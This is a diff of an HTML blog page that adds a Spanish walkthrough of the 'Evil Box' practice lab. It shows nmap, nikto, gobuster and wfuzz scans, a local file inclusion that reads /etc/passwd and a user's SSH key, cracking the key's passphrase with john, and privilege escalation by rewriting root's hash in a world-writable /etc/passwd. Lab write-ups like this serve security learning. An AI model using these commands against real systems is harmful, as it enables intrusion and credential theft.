@@ -15,7 +15,7 @@
         <!-- Core theme CSS (includes Bootstrap)-->
         <link href="css/styles.css" rel="stylesheet" />
     </head>
-    <body>
+    <body style="background-color: darkgrey">
         <!-- Navigation-->
         <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
             <div class="container px-4 px-lg-5">
@@ -32,17 +32,17 @@
             </div>
         </nav>
         <!-- Page Header-->
-        <header class="masthead" style="background-image: url('assets/img/about-bg.jpg')">
+        <header class="masthead" style="background-image: url('assets/DALL%C2%B7E%202023-01-27%2016.16.40%20-%20the%20silhouette%20of%20a%20black%20hood%20and%20a%20keyboard%20with%20lights%20to%20be%20seen,%20one%20line%20drawing.png')">
             <div class="container position-relative px-4 px-lg-5">
                 <div class="row gx-4 gx-lg-5 justify-content-center">
                     <div class="col-md-10 col-lg-8 col-xl-7">
                         <div class="post-heading">
-                            <h1>Titulo 1</h1>
-                            <h2 class="subheading">Subtitulo</h2>
+                            <h1>Evil Box</h1>
+                            <h2 class="subheading">Write Up</h2>
                             <span class="meta">
                                 Posted by
                                 <a>Eddie</a>
-                                on August 24, 2022
+                                on Juanary 27, 2023
                             </span>
                         </div>
                     </div>
@@ -54,15 +54,130 @@
             <div class="container px-4 px-lg-5">
                 <div class="row gx-4 gx-lg-5 justify-content-center">
                     <div class="col-md-10 col-lg-8 col-xl-7">
-                        <p>
-                        </p>
-                        <div><p>Empiezo haciendo un escaneo con nmap para ver puertos abiertos</p></div>
-                        <center><p>❯ nmap 192.168.1.19
-                        Nmap scan report for 192.168.1.19
-                        Host is up (0.0024s latency).
-                        PORT STATE SERVICE
-                        22/tcp open ssh
-                        80/tcp open http</p></center>
+                        <p><b>Intrusion</b></p>
+                        <hr>
+                        <p><i>Empiezo haciendo un escaneo con nmap para ver puertos abiertos</i></p>
+                        <pre>❯ nmap 192.168.1.19 
+Nmap scan report for 192.168.1.19
+Host is up (0.0024s latency).
+PORT STATE SERVICE
+22/tcp open ssh
+80/tcp open http</pre>
+                        <p><i>El puerto 80 tiene la página de Apache por defecto</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117182600.png" width="800">
+                        <p><i>Uso nikto para ver posibles vulnerabilidades o recursos en la página</i></p>
+                        <pre>
+❯ nikto -h http://192.168.1.19/
+---------------------------------------------------------------------------
++ Target IP: 192.168.1.19
++ Target Hostname: 192.168.1.19
++ Target Port: 80
++ Start Time: 2023-01-17 18:11:38 (GMT-3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ End Time: 2023-01-17 18:12:00 (GMT-3) (22 seconds)
+---------------------------------------------------------------------------
+                        </pre>
+                        <p><i>Me muestra un "robots.txt" un directorio "/secret/" y un "/icons/README"
+Nada interesante en robots.txt y /secret por ahora</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117183648.png">
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117183823.png">
+                        <p><i>Después de hacer fuzzing de subdominios u otras rutas y no encontrar nada, busque por archivos php o txt en el directorio
+/secret/</i></p>
+                        <pre>
+❯ gobuster dir -u http://192.168.1.19/secret/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-
+medium.txt -t 40 -x php,txt
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url: http://192.168.1.19/secret/
+[+] Method: GET
+[+] Threads: 40
+[+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.1.0
+[+] Extensions: php,txt
+[+] Timeout: 10s
+===============================================================
+/evil.php (Status: 200) [Size: 0]
+===============================================================
+2023/01/17 19:05:06 Finished
+===============================================================
+                        </pre>
+                        <p><i>El recurso evil.php existe, pero en la web todavía no muestra nada</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117190744.png">
+                        <p><i>Tiene pinta de ser un Local File Inclusion (LFI), por lo que lanzo otro escaneo para detectar algún parámetro web con el que pueda listar archivos locales de la máquina</i></p>
+                        <pre>
+❯ wfuzz -c --hc=404 --hw=0 -w /opt/SecLists/Miscellaneous/web/html-tags.txt 'http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd' 2>/dev/null
+********************************************************
+
+Target: http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd
+Total requests: 153
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                         
+=====================================================================
+
+000000032:   200        27 L     39 W       1458 Ch     "command"                                                                                       
+
+Total time: 0
+Processed Requests: 153
+Filtered Requests: 152
+Requests/sec.: 0
+                        </pre>
+                        <p><i>'command' parece ser el parámetro para intentar un LFI</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117192622.png" width="900">
+                        <p><i>Funciona, por lo que ahora podemos probar ver la id_rsa de algún usuario del sistema</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117204123.png">
+                        <p><i>Vemos la del usuario 'mowree' pero está encriptada. Con ssh2john podemos tratar de sacar la contraseña</i></p>
+                        <pre>
+❯ /usr/share/john/ssh2john.py id_rsa > hash
+                        </pre>
+                        <pre>
+❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+unicorn          (id_rsa)
+
+Session completed
+                        </pre>
+                        <p><i>Tengo la contraseña de la id_rsa por lo que ahora puedo intentar conectarme por ssh ingresando la clave de la id_rsa pero sin poner la contraseña del usuario 'mowree'</i></p>
+                        <pre>
+❯ ssh mowree@192.168.1.19 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+mowree@EvilBoxOne:~$ whoami
+mowree
+mowree@EvilBoxOne:~$ 
+                        </pre>
+                        <hr>
+                        <p><b>Elevando Privilegios</b></p>
+                        <hr>
+                        <p><i>Si listamos los permisos del archivo /etc/passwd vemos que otros pueden escribir</i></p>
+                        <pre>
+mowree@EvilBoxOne:~$ ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd
+                        </pre>
+                        <p><i>Por lo que ahora podemos crear una contraseña para el usuario root y poner el hash en el /etc/passwd</i></p>
+                        <pre>
+❯ openssl passwd -1
+Password: 
+Verifying - Password: 
+$1$eKwzP0P1$W4PsKYip9JqhXY2BAKMBe0                        
+                        </pre>
+                        <p><i>Con openssl generamos el hash de la contraseña "password123" y lo cambiamos por la x en /etc/passwd</i></p>
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230118010249.png">
+                        <hr> 
+                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230118010342.png">
                     </div>
                 </div>
             </div>
